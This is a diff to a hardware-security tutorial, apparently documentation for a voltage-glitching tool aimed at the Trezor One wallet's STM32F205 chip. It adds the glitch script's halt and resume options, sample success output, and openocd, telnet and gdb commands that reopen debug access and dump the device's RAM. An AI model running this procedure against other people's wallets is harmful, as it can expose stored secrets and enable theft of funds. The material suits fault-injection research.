@@ -42,6 +42,8 @@ Connect channel 1 of a oscilloscope to the `VCAP` line via the SMA connector, ch
 
 ![](images/09-pico-glitcher-setup.JPG)
 
+DO NOT connect the Trezor one during glitching via USB to your computer.
+
 ## Voltage traces
 
 Verify the startup sequence of the STM32F205 by measuring the voltage trace during startup:
@@ -67,3 +69,52 @@ python stm32f2-boot-debugger.py --rpico /dev/<tty-device> --length 100 500 --del
 ```
 
 ![](images/12-parameterspace.png)
+
+In the default configuration, the script does not halt if a positive glitch is detected. This is helpful to search for good parameters. If you want to get debug access to the RAM, you can use the `--halt` parameter and stop execution of the script. Use `--resume` to resume a previous capture.
+
+```bash
+python stm32f2-boot-debugger.py --rpico /dev/<tty-device> --length 100 500 --delay 175_600 176_700 --trigger-input ext1 --resume --halt
+```
+
+If the script is halted, further instructions are printed on in the terminal if a successful glitch is detected:
+
+```bash
+[+] Experiment 158	12914	(3)	176526	126	R	b'success: read zero'
+[+] Now connect the Trezor One via USB with your computer and go to the Trezor Suite app.
+    Wait for the Trezor One to connect. Do not abort this script!
+    If the pin input on the Trezor comes up, execute the following command to dump the memory:
+    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; reset run"
+    Connect to openocd via gdb or telnet:
+    $ telnet localhost 4444
+    $ arm-none-eabi-gdb
+    (gdb) target remote :3333
+    (gdb) monitor reset halt
+    (gdb) continue
+    Or dump the RAM as is with the following command:
+    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; dump_image ram.bin 0x20000000 0x1fffffff; exit"
+```
+
+In this state, you can either try to dump the RAM content:
+
+```bash
+openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; dump_image ram.bin 0x20000000 0x1fffffff; exit"
+```
+
+Or you can connect to the device via telnet or gdb:
+
+```bash
+openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; reset run"
+```
+
+Telnet:
+```bash
+telnet localhost 4444
+```
+
+GDB:
+```bash
+arm-none-eabi-gdb
+(gdb) target remote :3333
+(gdb) monitor reset halt
+(gdb) continue
+```
